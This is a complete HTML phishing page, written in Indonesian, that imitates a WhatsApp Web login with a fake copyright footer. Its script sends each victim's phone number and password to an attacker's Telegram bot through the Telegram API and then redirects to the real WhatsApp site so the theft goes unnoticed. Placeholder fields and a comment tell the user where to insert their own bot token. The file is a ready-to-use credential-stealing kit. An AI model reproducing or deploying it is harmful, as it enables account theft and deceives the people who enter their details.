<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #075E54;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 30px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
        }
        h2 {
            color: #075E54;
            text-align: center;
            margin-bottom: 25px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #25D366;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            margin-top: 15px;
            cursor: pointer;
        }
        button:hover {
            background: #128C7E;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 WhatsApp Web</h2>
        <input type="tel" id="phone" placeholder="Nomor Telepon" autocomplete="off">
        <input type="password" id="password" placeholder="Kata Sandi">
        <button onclick="sendData()">Login</button>
        <div class="footer">© 2026 WhatsApp Inc.</div>
    </div>

    <script>
        function sendData() {
            var phone = document.getElementById('phone').value;
            var password = document.getElementById('password').value;
            
            if(phone === '' || password === '') {
                alert('Harap isi semua field!');
                return;
            }
            
            // GANTI DENGAN TOKEN DAN CHAT ID LO!
            var botToken = 'YOUR_BOT_TOKEN_HERE';
            var chatId = 'YOUR_CHAT_ID_HERE';
            
            var message = `🔴 NEW DATA 🔴%0ANomor: ${phone}%0APassword: ${password}%0AWaktu: ${new Date()}`;
            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
            
            fetch(url)
                .then(() => {
                    alert('Login berhasil! Mengalihkan...');
                    window.location.href = 'https://web.whatsapp.com';
                })
                .catch(() => {
                    alert('Error, coba lagi');
                });
        }
    </script>
</body>
</html>
